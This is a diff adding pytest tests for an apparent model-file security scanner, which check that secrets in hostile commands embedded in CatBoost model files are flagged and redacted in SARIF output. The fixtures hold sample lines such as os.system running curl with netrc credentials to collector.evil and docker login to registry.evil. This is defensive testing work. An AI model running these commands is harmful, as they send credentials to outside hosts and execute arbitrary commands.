@@ -1428,6 +1428,34 @@ def test_catboost_sarif_redacts_dotted_function_argument_and_certificate_secrets
     assert "collector.evil.example" in sarif
 
 
+def test_catboost_sarif_redacts_command_specific_positional_credentials(tmp_path: Path) -> None:
+    secrets = ("netrcpass7", "dockerpass8", "awspass9")
+    model_path = tmp_path / "sarif_command_specific_credentials.cbm"
+    model_path.write_bytes(
+        _build_cbm(
+            [
+                f"os.system(\"curl --netrc-file <(echo 'machine x login alice password {secrets[0]}') "
+                'https://collector.evil/x")',
+                f'docker login -u alice -p {secrets[1]} registry.evil; os.system("id")',
+                f'aws configure set aws_secret_access_key {secrets[2]}; os.system("id")',
+            ],
+        ),
+    )
+
+    result = scan_model_directory_or_file(str(model_path), cache_scan_results=False)
+    failed_details = " ".join(str(check.details) for check in result.checks if check.status == CheckStatus.FAILED)
+    sarif = format_sarif_output(result, [str(model_path)])
+
+    assert determine_exit_code(result) == 1
+    for secret in secrets:
+        assert secret not in failed_details
+        assert secret not in sarif
+    assert "password <redacted>" in failed_details
+    assert "docker login -u alice -p <redacted>" in failed_details
+    assert "aws configure set" in failed_details
+    assert "<redacted>" in sarif
+
+
 def test_catboost_sarif_redacts_function_defaults_and_suffixed_aliases(tmp_path: Path) -> None:
     secrets = ("commandpass7", "defaultpass8", "suffixpass9")
     model_path = tmp_path / "sarif_function_default_secrets.cbm"
@@ -1822,6 +1850,26 @@ def test_catboost_display_preserves_benign_split_base64_literals() -> None:
     split_payload = f'"{payload[:12]}" "{payload[12:]}"'
 
     assert _redact_split_base64_evidence(split_payload) == split_payload
+
+
+def test_catboost_display_redacts_late_secret_in_split_base64_literals() -> None:
+    decoded = ("safe metadata " * 24) + 'token = "CATBOOST_LATE_SPLIT_SECRET_VALUE"'
+    payload = base64.b64encode(decoded.encode()).decode()
+    split_payload = " + ".join(f'"{payload[index : index + 16]}"' for index in range(0, len(payload), 16))
+
+    redacted = _redact_split_base64_evidence(split_payload)
+
+    assert redacted == "<redacted>"
+    assert "CATBOOST_LATE_SPLIT_SECRET_VALUE" not in redacted
+    assert payload[-16:] not in redacted
+
+
+def test_catboost_display_redacts_late_secret_in_base64_literal_collection() -> None:
+    decoded = ("safe metadata " * 24) + 'api_key = "CATBOOST_LATE_COLLECTION_SECRET_VALUE"'
+    payload = base64.b64encode(decoded.encode()).decode()
+    literal = "[" + ", ".join(f'"{payload[index : index + 16]}"' for index in range(0, len(payload), 16)) + "]"
+
+    assert _redact_literal_collection_evidence(literal) == "<redacted>"
 
 
 @pytest.mark.parametrize("collection", ["list", "tuple"])
